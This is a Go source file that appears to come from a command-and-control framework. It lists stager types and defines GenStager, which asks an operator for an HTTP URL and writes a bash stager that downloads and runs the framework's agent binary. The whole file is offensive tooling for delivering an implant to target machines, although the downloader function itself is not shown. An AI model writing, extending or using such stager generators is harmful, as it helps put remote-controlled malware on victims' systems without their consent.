package cc

import (
	"fmt"
	"os"
	"strconv"
)

var Stagers = []string{
	// generic
	"java",
	"php",
	"python",
	"python3",
	"perl",

	// for Linux
	"bash",

	// for Windows
	"powershell",
	"c#",
}

// GenStager generate a stager (to download actual agent binary and execute it)
func GenStager(agent_bin_path string) {
	if !CliYesNo("Use a stager") {
		return
	}
	for n, stager := range Stagers {
		CliPrintInfo("[%d] %s", n, stager)
	}
	choice := CliAsk("Your choice [0]: ", false)
	stager_n, err := strconv.Atoi(choice)
	if err != nil {
		CliPrintError("Invalid stager")
		return
	}
	chosen_stager := Stagers[stager_n]
	stager_filename := fmt.Sprintf("%s.%s.stager.bin", agent_bin_path, chosen_stager)

	switch chosen_stager {
	case "bash":
		url := CliAsk("Give me an HTTP download URL for agent binary: ", false)
		stager_data := bash_http_downloader(url)
		err = os.WriteFile(stager_filename, stager_data, 0600)
		if err != nil {
			CliPrintError("Failed to save stager data: %v", err)
			return
		}
		CliPrintSuccess("Stager saved as %s", stager_filename)
	default:
		CliPrintError("%s stager has not been implemented yet", chosen_stager)
	}
}
